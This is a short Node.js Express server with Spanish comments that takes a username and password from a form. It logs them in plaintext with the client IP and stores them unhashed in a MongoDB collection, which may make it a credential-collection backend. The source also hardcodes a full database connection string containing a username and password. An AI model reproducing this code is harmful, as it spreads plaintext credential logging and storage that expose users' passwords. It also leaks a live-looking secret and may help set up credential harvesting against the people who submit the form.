const express = require('express');
const { MongoClient } = require('mongodb');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Agrega esta línea para analizar datos de formularios codificados

app.use((req, res, next) => {
    res.header('x-content-type-options', 'nosniff');
    next();
});

app.disable('x-powered-by');

function connectLog (req, user, passwd) {
    const userIp = req.ip
    const userUrl = req.url

    console.log(`New connection -> IP: ${userIp} | Url: ${userUrl} | Data Received: Username -> ${user}, Password -> ${passwd}`)
}

const uri = 'mongodb+srv://witooz123:Ds1wfuGUxaqGvdSW@datacluster.s71xtyr.mongodb.net/?retryWrites=true&w=majority';

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/', async (req, res) => {
    try {
        const { user, passwd } = req.body;
        connectLog(req, user, passwd)

        // Conectar a la base de datos
        const client = new MongoClient(uri);
        await client.connect();

        // Seleccionar la base de datos y la colección
        const database = client.db('UserInfo');
        const collection = database.collection('user');

        // Insertar el mensaje en la colección
        await collection.insertOne({ user, passwd });

        // Desconectar del servidor de base de datos
        await client.close();

        res.status(201).sendFile(__dirname + '/goodProcess.html');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error al guardar el mensaje en la base de datos.');
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor activo en -> http://localhost:${PORT}/`);
});
